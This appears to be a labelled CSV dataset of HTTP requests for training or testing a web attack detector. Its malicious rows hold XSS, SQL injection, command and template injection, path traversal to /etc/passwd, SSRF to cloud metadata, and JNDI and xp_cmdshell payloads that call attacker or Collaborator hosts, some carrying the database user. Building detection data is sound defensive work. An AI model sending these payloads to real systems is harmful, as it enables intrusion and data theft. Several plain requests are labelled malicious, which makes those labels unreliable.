method,path,query,headers,body,ua,label
GET,"<a href=""http://malicious.com"" target=""_blank"">Click here</a>",,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,<IMG SRC=j&#X41vascript:alert('test')>,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
GET,/,,,,,0
GET,/,?75affb26b7=%3CxssBypass%2Fonpointermove=%28confirm%29%281%29%3EMoveMouseHere,,,,1
GET,"\""autof<x>ocus o<x>nfocus=alert<x>(1)//",,,,,1
GET,/static/js/row-where-WcP3LVMH.css,,,HTTP/1.1,,0
GET,/static/js/dialog-insert-IkYbeCii.png,,,HTTP/1.1,,0
GET,"alert.apply(null, [1])",,,,,1
GET,/assets/cat.svg,,,HTTP/1.1,,0
GET,/build/eval.min.js,,,HTTP/1.1,,0
GET,/static/js/whoami.js,,,HTTP/1.1,,0
GET,/media/where.min.js,,,HTTP/1.1,,0
GET,/,"javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\""/+/onmouseover=1/(f=prompt,f(1))//'>",,,,1
GET,/media/cat.svg,,,HTTP/1.1,,0
GET,/media/type-whoami-mhD5PVL4.svg,,,HTTP/1.1,,0
GET,/static/js/select-widget-8KKBHJrS.svg,,,HTTP/1.1,,0
GET,/media/dialog-delete-xNgjIN44.jpg,,,HTTP/1.1,,0
GET,/api/v1/map/data,lat=21.0285&lng=105.8542&zoom=15,,,,0
GET,/media/eval.js,,,HTTP/1.1,,0
GET,/,id=1'/**/OR/**/'1'='1,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,/,,,,,0
GET,/index.php?name=Guest%0d%0aSet-Cookie: session=1,,,,,1
GET,id=1' OR '1'='1,,,,,1
GET,/,"eval(atob(""YWxlcnQoKQ==""))",,,,1
GET,/assets/insert-widget-8XWC1CFs.png,,,HTTP/1.1,,0
GET,/media/whoami-type-qNCvYXje.woff2,,,HTTP/1.1,,0
GET,/assets/script-icon-k76Kj1zC.woff2,,,HTTP/1.1,,0
GET,/,,,,,0
GET,/build/where.png,,,HTTP/1.1,,0
GET,/assets/where-icon-i2pgg7rn.woff2,,,HTTP/1.1,,0
GET,/build/where-function-q5ySphlp.jpg,,,HTTP/1.1,,0
GET,"3;/* a */ DECLARE @c varchar(255);/* b */SELECT @c='ping '+master.sy s.fn_varbintohexstr(convert(varbinary,SYSTEM_USER))+'.000.burpco l'+'laborator.net';/*xx*/ EXEC Master.dbo.xp_cmdshell @c;/*xxx*/ EXE C sp_SYS_ProtoOp @id=3",,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,"<#assign ex = ""freemarker.template.utility.Execute""?new()>${ ex(""i d"")}",,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,${jndi:ldap://attacker.com/a},,,,,1
GET,/static/css/cat-handler-4hf7Ngw0.jpg,,,HTTP/1.1,,0
GET,/media/insert-menu-hRmpIsmJ.js,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
POST,/logs/client,,,"{""error"": ""Uncaught TypeError"", ""stack"": ""...""}",,0
GET,/media/alert.js,,,HTTP/1.1,,0
GET,/,/inskyXss?db=monasca&q=SELECT%20mean(%22value%22)%20FROM%20%22mem.used_perc%22%20WHERE%20%22resource_id%22%20%3D~%20%2F%5Ebfb959fd-8128-4a68-98c7-d062ebd2dc4b%2F%20AND%20time%20%3E%3D%20now()%20-%206h%20and%20time%20%3C%3D%20now()%20GROUP%20BY%20time(1m)%2C%20resource_id&epoch=ms,,,,1
GET,/build/tag-alert-Ip8ujYeV.css,,,HTTP/1.1,,0
GET,/static/js/onerror.png,,,HTTP/1.1,,0
GET,/media/delete-date-ktTWw0er.svg,,,HTTP/1.1,,0
GET,/media/update.css,,,HTTP/1.1,,0
GET,/*!%55NiOn*/%20/*!%53eLEct*/+,,,,,1
GET,"http://lmb1ikpej3yys0gqft8lxewm2d89w5qtgh840sp.burpcollaborator.net/ 6.17.0.RELEASE iPhone12,8 iOS/14.5.1)) community-user-",,,,,1
GET,/build/function-onerror-hyPxJ1Wz.jpg,,,HTTP/1.1,,0
,/index.html,,,,,0
GET,/static/js/where-zone-gdrwIhA1.woff2,,,HTTP/1.1,,0
GET,/,,,,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
GET,/media/select.jpg,,,HTTP/1.1,,0
GET,/build/whoami.svg,,,HTTP/1.1,,0
POST,/logs/client,,,"{""error"": ""Uncaught TypeError"", ""stack"": ""...""}",,0
GET,query { a: user(id:1) { name } b: user(id:2) { name } },,,,,1
GET,..\..\..\..\windows\system32\config\sam,,,,,1
GET,;getent$IFS$9hosts$IFS$9somehost.burpcollaborator.net;echo$IFS$9$((3 482*7301));,,,,,1
GET,/media/union.woff2,,,HTTP/1.1,,0
,/favicon.ico,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,0
GET,`uname -a`,,,,,1
POST,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",{{constructor.constructor('alert(1)')()}},,1
GET,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
GET,/static/js/drop-zone-Eb85lOVS.js,,,HTTP/1.1,,0
GET,"http://lmb1ikpej3yys0gqft8lxewm2d89w5qtgh840sp.burpcollaborator.net/ 6.17.0.RELEASE iPhone12,8 iOS/14.5.1)) community-user-",,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,/index.php?name=Guest%0d%0aSet-Cookie: session=1,,,,,1
GET,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: app.local
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
GET,/static/js/row-where-wstLux22.png,,,HTTP/1.1,,0
GET,rmi://attacker.com:1099/Exploit,,,,,1
GET,|| ls -la,,,,,1
GET,/static/js/insert.woff2,,,HTTP/1.1,,0
GET,http://169.254.169.254/latest/meta-data/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
GET,"', $or: [ {}, { 'order':'order",,,,,1
GET,<IMG SRC=j&#X41vascript:alert('test')>,,,,,1
GET,/media/date-onerror-iv4FKPZP.png,,,HTTP/1.1,,0
GET,/static/js/onerror.min.js,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,/build/delete.jpg,,,HTTP/1.1,,0
GET,"<!--#exec cmd=""dir"" -->",,,,,1
GET,"-1945+/*!%55NiOn*/%20/*!%53eLEct*/+1,2,3,%27soy%20vulnerable%27,5,6, 7,8,9,10,11,12,13,14,15,16,17,18,19+--+",,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: example.com
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,/,onerror=alert(1),,,,1
GET,/static/js/eval.png,,,HTTP/1.1,,0
GET,/,?a8aafb9364=%3Cimg%20src%20onerror=confirm%281%29%3E,,,,1
GET,/media/onerror-zone-P8zBRKnq.woff2,,,HTTP/1.1,,0
GET,"document[""cookie""]",,,,,1
GET,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,/,,,,,0
GET,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: app.local
Accept: */*",,,1
GET,/build/date-from-oTxl1V9N.woff2,,,HTTP/1.1,,0
GET,"Tarun~<""><details/open/ontoggle=""jAvAsCrIpT&colon;alert&lpar;/xss-by -tarun/&rpar;"">XXXXX</a>",,,,,1
GET,/static/js/insert-menu-FxwrHmQl.js,,,HTTP/1.1,,0
GET,/static/js/widget-eval-XSJ6WWW9.css,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,/media/drop.woff2,,,HTTP/1.1,,0
GET,/assets/from-menu-ns9uHcEF.js,,,HTTP/1.1,,0
GET,/static/js/from.min.js,,,HTTP/1.1,,0
GET,"<j id=x style=""-webkit-user-modify:read-write"" onfocus={window.onerr or=eval}throw/0/+name>H</j>#x",,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
GET,"""><video><source onerror=eval(atob(http://some_host)) id=dmFyIGE9ZG9 jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vYXlkaW5 ueXVudXMueHNzLmh0Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#6 1;>",,,,,1
GET,/assets/where.css,,,HTTP/1.1,,0
GET,"data:text/html,<form action=https://127.0.0.1/xss-cp.php method=post ><input type=hidden name=a value=""<img/src=//127.0.0.1/yt.jpg onpoin terenter=alert`1`>""><input type=submit></form>",,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
GET,/,onerror=alert(1),,,,1
GET,"<!--#exec cmd=""dir"" -->",,,,,1
GET,/static/js/onerror.js,,,HTTP/1.1,,0
GET,/media/from-function-64X7pQ7G.svg,,,HTTP/1.1,,0
GET,/media/where.woff2,,,HTTP/1.1,,0
GET,/assets/cat.png,,,HTTP/1.1,,0
GET,/static/js/insert.min.css,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
GET,../../../../etc/passwd,,,,,1
GET,id=1' AND (SELECT 1 FROM users WHERE username='admin' AND password LIKE 'A%')--,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: example.com
Accept: */*",,,1
GET,/uploads/628668cae9db4d51b4edf55214b73fca-Facebook Image.jpg?response-content-disposition=inline%3B%20filename%2A%3DUTF-8%27%276b67c704b68a4517aa6664c1df2f7afe&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=9wnmzzHYVGwlnTscRdzx%2F20260310%2F%2Fs3%2Faws4_request&X-Amz-Date=20260310T023341Z&X-Amz-Expires=3600&X-Amz-SignedHeaders=host&X-Amz-Signature=5bfffbe1cc40d1ef12ee72b2126381daf34408143c87a1c0bf11e66c162e101b&q=%3Cscript%3E%3C/script%3E,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: example.com
Accept: */*",,,1
GET,"<iframe src=""http://169.254.169.254/latest/meta-data/""></iframe>",,,,,1
GET,/static/js/from.js,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,/static/css/from-function-Lr2sAJrz.jpg,,,HTTP/1.1,,0
GET,../../../../etc/passwd,,,,,1
GET,/build/drop.js,,,HTTP/1.1,,0
GET,<img src onerror=confirm(1)>,,,,,1
GET,"3;/* a */ DECLARE @c varchar(255);/* b */SELECT @c='ping '+master.sy s.fn_varbintohexstr(convert(varbinary,SYSTEM_USER))+'.000.burpco l'+'laborator.net';/*xx*/ EXEC Master.dbo.xp_cmdshell @c;/*xxx*/ EXE C sp_SYS_ProtoOp @id=3",,,,,1
GET,/static/js/union.min.js,,,HTTP/1.1,,0
GET,/static/css/update.js,,,HTTP/1.1,,0
GET,/assets/function-where-2dQ97oIV.css,,,HTTP/1.1,,0
GET,/assets/union-function-oezJjRB5.svg,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
GET,/,<xssBypass/onpointermove=(confirm)(1)>MoveMouseHere,,,,1
GET,/build/eval.woff2,,,HTTP/1.1,,0
GET,/assets/drop.svg,,,HTTP/1.1,,0
GET,/static/css/from-dialog-78kAc3gI.js,,,HTTP/1.1,,0
GET,/static/js/union.svg,,,HTTP/1.1,,0
POST,/,,,"{""$gt"": """"}",,1
GET,//////////////////etc/passwd,,,,,1
POST,/login,,,Content-Type: application/x-www-form-urlencoded user=john&pass=doe,,0
GET,/build/handler-drop-F4zHre2C.png,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: www.mysite.com
Accept: */*",,,1
GET,/static/js/function-insert-2vEzWozX.jpg,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,/media/form-onerror-inS3jSHr.svg,,,HTTP/1.1,,0
GET,/static/js/cat.jpg,,,HTTP/1.1,,0
GET,/static/css/where.svg,,,HTTP/1.1,,0
GET,/assets/dialog-alert-Fc4qPloT.css,,,HTTP/1.1,,0
GET,"Tarun~<""><details/open/ontoggle=""jAvAsCrIpT&colon;alert&lpar;/xss-by -tarun/&rpar;"">XXXXX</a>",,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,/assets/drop.jpg,,,HTTP/1.1,,0
GET,/static/css/where-widget-WHYc1BV5.js,,,HTTP/1.1,,0
GET,/,,,,,0
GET,/static/js/where-clause-Y0RpwIn7.woff2,,,HTTP/1.1,,0
GET,/static/js/script-function-9SrsDpn2.svg,,,HTTP/1.1,,0
GET,/static/css/button-delete-CASR07JK.png,,,HTTP/1.1,,0
GET,id=1; SELECT pg_sleep(5)--,,,,,1
GET,/build/onerror.png,,,HTTP/1.1,,0
GET,RCPT TO: test@evil.com,,,,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
GET,/media/union.js,,,HTTP/1.1,,0
GET,/media/drop.min.js,,,HTTP/1.1,,0
GET,javascript:setInterval('ale'+'rt(document.domain)'),,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,"<a href=""http://malicious.com"" target=""_blank"">Click here</a>",,,,,1
GET,db.injection.insert%28%7Bsuccess:1%7D%29%3B,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: www.mysite.com
Accept: */*",,,1
GET,/,,,,,0
GET,%0d%0aSet-Cookie: session=attacker,,,,,1
GET,/media/alert.woff2,,,HTTP/1.1,,0
GET,"document[""cookie""]",,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
GET,/,__proto__[v-if]=_c.constructor('alert(1)')(),,,,1
GET,/static/css/whoami.min.css,,,HTTP/1.1,,0
GET,/static/js/onerror-handler-xq7VnsXQ.css,,,HTTP/1.1,,0
GET,/static/css/icon-select-YLBJfNl8.svg,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,/build/from.png,,,HTTP/1.1,,0
GET,/static/css/alert.css,,,HTTP/1.1,,0
GET,/,?4cbb3ffb50=3%3B%2F%2A%20a%20%2A%2F%20DECLARE%20@c%20varchar%28255%29%3B%2F%2A%20b%20%2A%2FSELECT%20@c=%27ping%20%27+master.sys.fn_varbintohexstr%28convert%28varbinary%2CSYSTEM_USER%29%29+%27.000.burpcol%27+%27laborator.net%27%3B%2F%2Axx%2A%2F%20EXEC%20Master.dbo.xp_cmdshell%20@c%3B%2F%2Axxx%2A%2F%20EXEC%20sp_SYS_ProtoOp%20@id=3,,,,1
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,/,?34ea04b04c=%3CIMG%20SRC=j&%23X41vascript:alert%28%27test%27%29%3E,,,,1
GET,/assets/row-drop-LgTdEc40.svg,,,HTTP/1.1,,0
GET,union select,,,,,1
GET,/build/delete.jpg,,,HTTP/1.1,,0
GET,"<#assign ex = ""freemarker.template.utility.Execute""?new()>${ ex(""i d"")}",,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,/static/css/drop.min.js,,,HTTP/1.1,,0
GET,/static/js/alert-widget-Rq8Gb0gi.png,,,HTTP/1.1,,0
GET,/static/js/row-union-S3FIPsmO.css,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,/build/delete-type-YmbIiRz2.jpg,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,/static/js/delete-icon-0B7LhUFw.svg,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
GET,/,/&lt;svg/onload&equals;alert(1)&gt;,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,QUIT,,,,,1
GET,/build/cat-image-CkIOZbWD.jpg,,,HTTP/1.1,,0
GET,/static/css/select-image-kaG4uaws.jpg,,,HTTP/1.1,,0
GET,/assets/from-date-RqhcOCLq.png,,,HTTP/1.1,,0
GET,/,,,,,0
GET,/static/js/script-clause-M4qDlwIf.css,,,HTTP/1.1,,0
GET,/build/delete.jpg,,,HTTP/1.1,,0
GET,/media/onerror.woff2,,,HTTP/1.1,,0
GET,/static/css/delete.js,,,HTTP/1.1,,0
GET,/static/css/icon-script-kpKLOkfh.js,,,HTTP/1.1,,0
GET,/assets/drop.min.css,,,HTTP/1.1,,0
GET,/build/insert.woff2,,,HTTP/1.1,,0
GET,/assets/onerror-image-lNAFGtkE.woff2,,,HTTP/1.1,,0
GET,/assets/form-script-BBJjjkri.svg,,,HTTP/1.1,,0
GET,$(whoami),,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: app.local
Accept: */*",,,1
GET,/assets/delete-icon-dpciXIFG.png,,,HTTP/1.1,,0
GET,/media/widget-union-PM3YwfE1.png,,,HTTP/1.1,,0
GET,/,?selectPromotionId=986205&sku=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,,,,1
GET,/static/css/alert.jpg,,,HTTP/1.1,,0
GET,/,<svg/onload=alert(=RND=)//,,,,1
GET,alert?.(document?.cookie),,,,,1
GET,alert?.(document?.cookie),,,,,1
GET,/build/function-whoami-poZ6eZKQ.png,,,HTTP/1.1,,0
GET,javascript:setInterval('ale'+'rt(document.domain)'),,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,"http://lmb1ikpej3yys0gqft8lxewm2d89w5qtgh840sp.burpcollaborator.net/ 6.17.0.RELEASE iPhone12,8 iOS/14.5.1)) community-user-",,,,,1
GET,<script>alert('XSS')</script>,,,,,1
GET,"Tarun~<""><details/open/ontoggle=""jAvAsCrIpT&colon;alert&lpar;/xss-by -tarun/&rpar;"">XXXXX</a>",,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,/,__proto__[admin]=true,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,/media/onerror.woff2,,,HTTP/1.1,,0
GET,/assets/update.css,,,HTTP/1.1,,0
GET,/static/css/alert.woff2,,,HTTP/1.1,,0
GET,/,,,,,0
GET,/media/image-union-iRu2jdgb.jpg,,,HTTP/1.1,,0
GET,/static/js/type-select-OE6ysQjx.css,,,HTTP/1.1,,0
GET,/static/js/onerror-icon-pFY3b1KM.png,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,/media/insert-type-245imRyQ.woff2,,,HTTP/1.1,,0
GET,/media/update.png,,,HTTP/1.1,,0
GET,/build/where.jpg,,,HTTP/1.1,,0
GET,/assets/type-script-U3QYlz6F.png,,,HTTP/1.1,,0
GET,<script>alert('XSS')</script>,,,,,1
GET,/build/select-tag-ZPd277o6.svg,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,/assets/clause-insert-YtQQg2Wm.woff2,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
GET,"<!--#exec cmd=""dir"" -->",,,,,1
GET,"O:8:""Database"":1:{s:4:""host"";s:9:""localhost"";}",,,,,1
POST,/,,,{smart_f_shell_exec('id')},,1
GET,/assets/select.woff2,,,HTTP/1.1,,0
GET,/,,,,,0
GET,/media/insert.png,,,HTTP/1.1,,0
GET,javascript:setInterval('fet'+'ch(document.domain)'),,,,,1
GET,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,/,"""//Onx=""""//onfocus=prompt(1)>",,,,1
GET,/static/js/delete-dialog-6rRgxpXj.css,,,HTTP/1.1,,0
GET,javascript:setInterval('prom'+'pt(document.domain)'),,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: app.local
Accept: */*",,,1
GET,/static/js/where.jpg,,,HTTP/1.1,,0
